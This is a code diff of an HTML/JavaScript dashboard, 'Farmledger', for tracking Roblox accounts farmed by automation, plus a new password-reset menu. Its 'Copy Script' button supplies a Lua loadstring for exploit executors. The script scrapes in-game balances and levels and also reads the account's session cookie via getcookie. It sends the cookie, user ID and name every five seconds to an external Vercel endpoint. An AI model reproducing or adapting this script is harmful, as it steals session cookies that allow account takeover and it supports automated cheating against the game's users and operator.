@@ -13,17 +13,31 @@ html{scroll-padding-top:env(safe-area-inset-top,0px)}*{box-sizing:border-box}
 body{margin:0;background:var(--bg);color:var(--ink);font:500 14px/1.5 Manrope,system-ui,sans-serif}
 .w{max-width:1280px;margin:0 auto;padding:18px 18px 60px}
 button,input{font:inherit;color:inherit}:focus-visible{outline:2px solid var(--ac);outline-offset:2px}
-.bar{display:flex;align-items:center;gap:14px;flex-wrap:wrap;margin-bottom:16px}
+
+/* الشريط العلوي */
+.bar{display:flex;align-items:center;gap:14px;flex-wrap:wrap;margin-bottom:16px;position:relative}
 .logo{font:800 20px 'Bricolage Grotesque',sans-serif;letter-spacing:-.02em;display:flex;align-items:center;gap:9px}
 .logo i{width:26px;height:26px;border-radius:8px;background:conic-gradient(from 200deg,var(--ac),var(--ac2),var(--ok),var(--ac));display:block}
 .meta{color:var(--mute);font-size:13px;display:flex;gap:16px;flex-wrap:wrap}.meta b{color:var(--ink)}
 .sp{flex:1}
-.b{background:var(--p);border:1px solid var(--line);border-radius:9px;padding:7px 14px;cursor:pointer;font-weight:700;font-size:13px}
+.b{background:var(--p);border:1px solid var(--line);border-radius:9px;padding:7px 14px;cursor:pointer;font-weight:700;font-size:13px;transition:0.2s}
 .b:hover{border-color:var(--ac)}.b.pri{background:var(--ac);border-color:var(--ac);color:#fff}
 .b.live.on{border-color:var(--ok);color:var(--ok)}
-.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--mute);margin-inline-end:7px}.on .dot{background:var(--ok);box-shadow:0 0 0 0 var(--ok);animation:pu 1.6s infinite}
-@keyframes pu{70%{box-shadow:0 0 0 7px transparent}}
-@media (prefers-reduced-motion:reduce){.on .dot{animation:none}}
+
+/* قائمة المستخدم */
+.user-menu{position:relative;margin-left:10px;}
+.user-trigger{display:flex;align-items:center;gap:10px;cursor:pointer;padding:5px 10px;border-radius:10px;border:1px solid transparent;transition:0.2s;}
+.user-trigger:hover{background:var(--p);border-color:var(--line);}
+.user-avatar{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--ac2),var(--ac));color:#fff;display:grid;place-items:center;font-weight:800;font-size:16px;box-shadow:0 0 10px rgba(124,140,255,0.3);}
+.user-name{font-weight:700;font-size:14px;}
+.user-dropdown{position:absolute;top:calc(100% + 8px);right:0;background:var(--p2);border:1px solid var(--line);border-radius:12px;width:200px;padding:6px;display:none;flex-direction:column;box-shadow:0 10px 30px rgba(0,0,0,0.5);z-index:100;}
+.user-dropdown.show{display:flex;}
+.user-dropdown button, .user-dropdown a{display:flex;width:100%;text-align:start;padding:10px 12px;border:none;background:none;border-radius:8px;cursor:pointer;font-weight:600;font-size:13px;color:var(--ink);text-decoration:none;transition:0.2s;}
+.user-dropdown button:hover{background:var(--p);}
+.user-dropdown a:hover{background:rgba(255,107,125,0.1);color:var(--bad);}
+.dropdown-divider{height:1px;background:var(--line);margin:4px 0;}
+
+/* الهيرو */
 .hero{display:grid;grid-template-columns:1.5fr 1fr;gap:14px;margin-bottom:14px}
 .card{background:var(--p);border:1px solid var(--line);border-radius:16px;padding:20px;position:relative;overflow:hidden}
 .net{background:radial-gradient(120% 140% at 0% 0%,var(--glow),transparent 60%),var(--p)}
@@ -55,8 +69,6 @@ tbody tr:hover{background:var(--p2)}tr.sel{background:var(--glow)}
 .pill i{width:6px;height:6px;border-radius:50%;background:currentColor}
 .s-online{color:var(--ok);border-color:color-mix(in srgb,var(--ok) 40%,transparent);background:color-mix(in srgb,var(--ok) 10%,transparent)}
 .s-offline{color:var(--mute);border-color:var(--line)}
-.s-captcha{color:var(--warn);border-color:color-mix(in srgb,var(--warn) 40%,transparent);background:color-mix(in srgb,var(--warn) 10%,transparent)}
-.s-banned{color:var(--bad);border-color:color-mix(in srgb,var(--bad) 40%,transparent);background:color-mix(in srgb,var(--bad) 10%,transparent)}
 .pc{background:color-mix(in srgb,var(--ac) 14%,transparent);color:var(--ac);border:1px solid color-mix(in srgb,var(--ac) 35%,transparent);padding:2px 10px;border-radius:7px;font-size:12px;font-weight:800}
 .u{font:500 13px 'JetBrains Mono',monospace;background:var(--p2);border:1px solid var(--line);border-radius:7px;padding:3px 9px;cursor:copy}
 .u:hover{border-color:var(--ac)}
@@ -67,10 +79,11 @@ tbody tr:hover{background:var(--p2)}tr.sel{background:var(--glow)}
 .empty{padding:36px;text-align:center;color:var(--mute)}
 .bulk{position:fixed;inset-inline:0;bottom:calc(16px + env(safe-area-inset-bottom,0px));margin:auto;width:max-content;max-width:94vw;background:var(--p2);border:1px solid var(--ac);border-radius:14px;padding:10px 14px;display:flex;gap:10px;align-items:center;box-shadow:0 12px 40px rgba(0,0,0,.4)}
 .bulk[hidden]{display:none}
+
+/* المودال */
 dialog{background:var(--p);color:var(--ink);border:1px solid var(--line);border-radius:16px;padding:22px;width:min(400px,92vw)}dialog::backdrop{background:rgba(0,0,0,.6)}
 dialog h2{margin:0 0 12px;font:800 20px 'Bricolage Grotesque'}dialog label{display:block;margin-bottom:10px;color:var(--mute);font-size:12px;font-weight:700}
 dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var(--line);border-radius:8px;padding:8px 10px}
-.g2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
 @media(max-width:800px){.hero{grid-template-columns:1fr}}
 </style>
 </head>
@@ -78,12 +91,24 @@ dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var
 <div class="w">
 <div class="bar">
   <div class="logo"><i></i>Farmledger</div>
-  <div class="meta"><span><b id="mAcc">0</b> accounts</span><span><b id="mLive">0</b> live</span><span>session <b id="mSes">0h</b></span></div>
+  <div class="meta"><span><b id="mAcc">0</b> accounts</span><span><b id="mLive">0</b> live</span></div>
   <div class="sp"></div>
+  
   <button class="b live on" id="live"><span class="dot"></span>Live</button>
-  <!-- 🔴 الزر الجديد -->
-  <button class="b" id="copy-script">Copy Script</button>
   <button class="b" id="exp">Export CSV</button>
+  <button class="b pri" id="copy-script">Copy Script</button>
+
+  <div class="user-menu">
+    <div class="user-trigger" onclick="toggleMenu()">
+      <div class="user-avatar" id="uAvatar">O</div>
+      <div class="user-name" id="uName">Overseer</div>
+    </div>
+    <div class="user-dropdown" id="uDropdown">
+      <button onclick="openResetModal()">🔑 Reset Password</button>
+      <div class="dropdown-divider"></div>
+      <a href="/logout">🚪 Sign Out</a>
+    </div>
+  </div>
 </div>
 
 <div class="hero">
@@ -102,17 +127,26 @@ dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var
 </div>
 
 <div class="mach" id="mach"></div>
-
 <div class="tb" id="chips"></div>
 <div class="tb"><input type="search" id="q" placeholder="Search username or machine" aria-label="Search"><span class="sub" id="cnt"></span></div>
 
-<div class="tw"><table><thead><tr id="th"></tr></thead><tbody id="tbd"></tbody></table><div class="empty" id="emp" hidden>No accounts match. Clear the filters or add an account.</div></div>
+<div class="tw"><table><thead><tr id="th"></tr></thead><tbody id="tbd"></tbody></table><div class="empty" id="emp" hidden>No accounts match.</div></div>
 </div>
 
 <div class="bulk" id="bulk" hidden><b id="bn"></b><button class="b" id="bcopy">Copy usernames</button><button class="b" id="bdel" style="color:var(--bad)">Delete</button><button class="b" id="bclr">Clear</button></div>
 
+<dialog id="resetModal">
+  <form method="dialog" id="resetForm">
+    <h2>Reset Password</h2>
+    <label>New Password<input type="password" name="newpass" id="newPass" required minlength="4" placeholder="Enter new password"></label>
+    <div style="display:flex;gap:8px;margin-top:15px">
+      <button class="b pri" value="ok" style="flex:1">Save</button>
+      <button class="b" value="x" formnovalidate style="flex:1">Cancel</button>
+    </div>
+  </form>
+</dialog>
+
 <script>
-// 🔴 ربط بيانات البايثون مع الجافاسكربت
 const SERVER_DATA = {
     accounts: {{ accounts | tojson | safe }},
     stats: {{ stats | tojson | safe }},
@@ -123,7 +157,6 @@ var $=function(i){return document.getElementById(i)},R=function(a,b){return a+Ma
 var seed=7;function rnd(){seed=(seed*16807)%2147483647;return seed/2147483647}
 var PCS=["XEON V4","RYZEN 02","DDC-1"];
 
-// تحويل البيانات من البايثون إلى الشكل اللي التصميم يحتاجه
 var accs = [];
 if (SERVER_DATA && SERVER_DATA.accounts) {
     accs = SERVER_DATA.accounts.map(function(a, i) {
@@ -131,22 +164,17 @@ if (SERVER_DATA && SERVER_DATA.accounts) {
         let swiper = (a.skills && a.skills['swiper']) ? a.skills['swiper'] : 0;
         let total = a.cash + a.bank;
         return {
-            id: i + 1,
-            user: a.name,
-            pc: a.pc || "MR 1",
+            id: i + 1, user: a.name, pc: a.pc || "MR 1",
             st: a.online ? "online" : "offline",
-            pocket: a.cash || 0,
-            bank: a.bank || 0,
+            pocket: a.cash || 0, bank: a.bank || 0,
             l: [a.total_level || 0, stamina, swiper],
             mins: Math.floor((a.uptime || 0) / 60),
-            h: [total, total], // رسم بياني وهمي بسيط
-            sel: 0
+            h: [total, total], sel: 0
         };
     });
 }
 
 var ses0=Date.now()-13.8*36e5,G=[],flt="all",pcf="",q="",sk="bank",sd=-1,live=true;
-
 var tot=function(a){return a.pocket+a.bank};
 var $$=function(){return accs.reduce(function(s,a){return s+tot(a)},0)};
 var base=$$()*.2;for(var g=0;g<40;g++)G.push(base+($$()-base)*(g/39)*(0.9+rnd()*.1));
@@ -155,11 +183,10 @@ function M(n){var s=n<0?"-":"";n=Math.abs(n);return s+"$"+(n>=1e6?(n/1e6).toFixe
 function eco(a){var t=tot(a);return t>=20000?["Good","g"]:t>=6000?["Low balance","l"]:["Drained","d"]}
 var cols=[["st","Status"],["pc","Machine"],["user","Username"],["eco","Economy"],["mins","Online"],["l0","Levels"],["pocket","Pocket"],["bank","Bank"],["tot","Total"],["h","Trend"]];
 function val(a,k){return k==="tot"?tot(a):k==="eco"?tot(a):k==="l0"?a.l[0]:k==="h"?a.h[a.h.length-1]-a.h[0]:a[k]}
-function spark(arr,w,h,col,fill){var mn=Math.min.apply(0,arr),mx=Math.max.apply(0,arr),d=mx-mn||1,p=arr.map(function(v,i){return(i/(arr.length-1)*w).toFixed(1)+","+(h-3-(v-mn)/d*(h-8)).toFixed(1)});
- return(fill?'<path d="M0,'+h+' L'+p.join(" L")+' L'+w+','+h+'Z" fill="url(#gf)"/>':"")+'<polyline points="'+p.join(" ")+'" fill="none" stroke="'+col+'" stroke-width="'+(fill?2.5:1.8)+'" stroke-linejoin="round" stroke-linecap="round"/>'}
+function spark(arr,w,h,col,fill){var mn=Math.min.apply(0,arr),mx=Math.max.apply(0,arr),d=mx-mn||1,p=arr.map(function(v,i){return(i/(arr.length-1)*w).toFixed(1)+","+(h-3-(v-mn)/d*(h-8)).toFixed(1)}); return(fill?'<path d="M0,'+h+' L'+p.join(" L")+' L'+w+','+h+'Z" fill="url(#gf)"/>':"")+'<polyline points="'+p.join(" ")+'" fill="none" stroke="'+col+'" stroke-width="'+(fill?2.5:1.8)+'" stroke-linejoin="round" stroke-linecap="round"/>'}
 
 function top(){var T=$$(),hrs=(Date.now()-ses0)/36e5,pr=T-base,hr=pr/hrs,live=accs.filter(function(a){return a.st==="online"}).length,good=accs.filter(function(a){return a.st==="online"||a.st==="offline"}).length;
- $("mAcc").textContent=accs.length;$("mLive").textContent=live;$("mSes").textContent=Math.floor(hrs)+"h "+Math.floor(hrs%1*60)+"m";
+ $("mAcc").textContent=accs.length;$("mLive").textContent=live;
  $("nw").textContent=M(T);$("nwSub").textContent="Average "+M(T/(accs.length||1))+" per account  |  Pocket "+M(accs.reduce(function(s,a){return s+a.pocket},0))+"  |  Bank "+M(accs.reduce(function(s,a){return s+a.bank},0));
  $("kp1").textContent="+"+M(pr);$("kp1s").textContent="over "+Math.floor(hrs)+"h "+Math.floor(hrs%1*60)+"m";$("kp2").textContent=M(hr);$("kp3").textContent=M(hr*24);
  var hp=accs.length?good/accs.length:0;$("kp4").textContent=Math.round(hp*100)+"%";$("rg").style.strokeDashoffset=157*(1-hp);
@@ -189,43 +216,91 @@ $("q").oninput=function(){q=this.value.trim().toLowerCase();rows()};
 $("live").onclick=function(){live=!live;this.classList.toggle("on",live)};
 $("bclr").onclick=function(){accs.forEach(function(a){a.sel=0});rows()};
 
-// 🔴 ربط زر الحذف بالسيرفر
 $("bdel").onclick=async function(){
     var selected = accs.filter(function(a){return a.sel}).map(function(a){return a.user});
     if(!selected.length) return;
     if(!confirm("Are you sure you want to delete " + selected.length + " account(s) from the database?")) return;
-    
-    for(var i=0; i<selected.length; i++){
-        await fetch('/api/delete', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({name: selected[i]})
-        });
+    for(var i=0; i<selected.length; i++) {
+        await fetch('/api/delete', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({name: selected[i]}) });
     }
     location.reload();
 };
 
 $("bcopy").onclick=function(){try{navigator.clipboard.writeText(accs.filter(function(a){return a.sel}).map(function(a){return a.user}).join("\n"))}catch(e){}};
-
 $("exp").onclick=function(){var t="\uFEFFstatus,machine,username,pocket,bank,total\n"+accs.map(function(a){return[a.st,a.pc,a.user,a.pocket,a.bank,tot(a)].join(",")}).join("\n");try{var l=document.createElement("a");l.href=URL.createObjectURL(new Blob([t],{type:"text/csv"}));l.download="accounts.csv";l.click()}catch(e){}};
 
-// 🔴 زر نسخ السكربت الجديد
-$("copy-script").onclick = async function() {
+function copyText(text) {
+    if (navigator.clipboard && window.isSecureContext) {
+        return navigator.clipboard.writeText(text);
+    } else {
+        let textArea = document.createElement("textarea");
+        textArea.value = text;
+        textArea.style.position = "fixed";
+        textArea.style.left = "-999999px";
+        textArea.style.top = "-999999px";
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        return new Promise((res, rej) => {
+            document.execCommand('copy') ? res() : rej();
+            textArea.remove();
+        });
+    }
+}
+
+$("copy-script").onclick = function() {
     const script = `repeat task.wait() until game:IsLoaded()\n\ngetgenv().OverseerConfig = {\n    ["key"] = "${SERVER_DATA.my_key}",\n    ["PC_NAME"] = "MR 1"\n}\n\nloadstring([[c=getgenv().OverseerConfig p=game.Players.LocalPlayer h=game:GetService"HttpService" r=request or http_request d={fishing=1,stamina=1,shelfstocker=1,janitor=1,swiper=1,farming=1,cook=1} ck="" if getcookie then ck=getcookie() elseif syn and syn.getcookie then ck=syn.getcookie() end task.spawn(function()while wait(5)do b,cc,l,s=0,0,0,{} for _,o in next,p.PlayerGui:GetDescendants()do if o:IsA"TextLabel"then t=o.Text b=tonumber(t:match"Bank Balance:%D*(%d+)" )or b cc=tonumber(t:match"Hand Balance:%D*(%d+)" )or cc l=tonumber(t:match"Total Level:%D*(%d+)" )or l n,v=t:match"([%a%s]+):%s*(%d+)" if n and v then n=n:gsub("%s",""):lower() if d[n] then s[#s+1]={name=n,level=v+0}end end end end pcall(r,{Url="https://flame-ten-18.vercel.app/api/report",Method="POST",Body=h:JSONEncode({k=c.key,c=cc,b=b,l=l,s=s,n=p.Name,dn=p.DisplayName,u=p.UserId,pc=c.PC_NAME,ck=ck})})end end)]])()`;
-    try {
-        await navigator.clipboard.writeText(script);
+    
+    copyText(script).then(() => {
         const btn = $("copy-script");
         const old = btn.innerHTML;
         btn.innerHTML = "✅ Copied!";
         btn.style.color = "var(--ok)";
         btn.style.borderColor = "var(--ok)";
-        setTimeout(() => {
-            btn.innerHTML = old;
-            btn.style.color = "";
-            btn.style.borderColor = "";
-        }, 2000);
-    } catch(e) {
-        alert("Failed to copy.");
+        setTimeout(() => { btn.innerHTML = old; btn.style.color = ""; btn.style.borderColor = ""; }, 2000);
+    }).catch(err => alert("Failed to copy script."));
+};
+
+function toggleMenu() {
+    $("uDropdown").classList.toggle("show");
+}
+window.onclick = function(e) {
+    if (!e.target.closest('.user-menu')) {
+        $("uDropdown").classList.remove("show");
+    }
+}
+
+var userKey = SERVER_DATA.my_key || "Overseer";
+$("uName").textContent = userKey;
+$("uAvatar").textContent = userKey.substring(0, 2).toUpperCase();
+
+function openResetModal() {
+    $("resetModal").showModal();
+    $("uDropdown").classList.remove("show");
+}
+
+$("resetForm").onsubmit = async function(e) {
+    if (!e.submitter || e.submitter.value !== "ok") return;
+    e.preventDefault();
+    const newPass = $("newPass").value;
+    if(newPass.length < 4) { alert("Password must be at least 4 chars"); return; }
+    
+    try {
+        const res = await fetch('/api/reset_password', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ username: userKey, new_password: newPass })
+        });
+        const data = await res.json();
+        if(res.ok) {
+            alert("✅ Password reset successfully!");
+            $("resetModal").close();
+            $("newPass").value = "";
+        } else {
+            alert("Error: " + (data.error || "Unknown"));
+        }
+    } catch(err) {
+        alert("Failed to connect to server.");
     }
 };
 
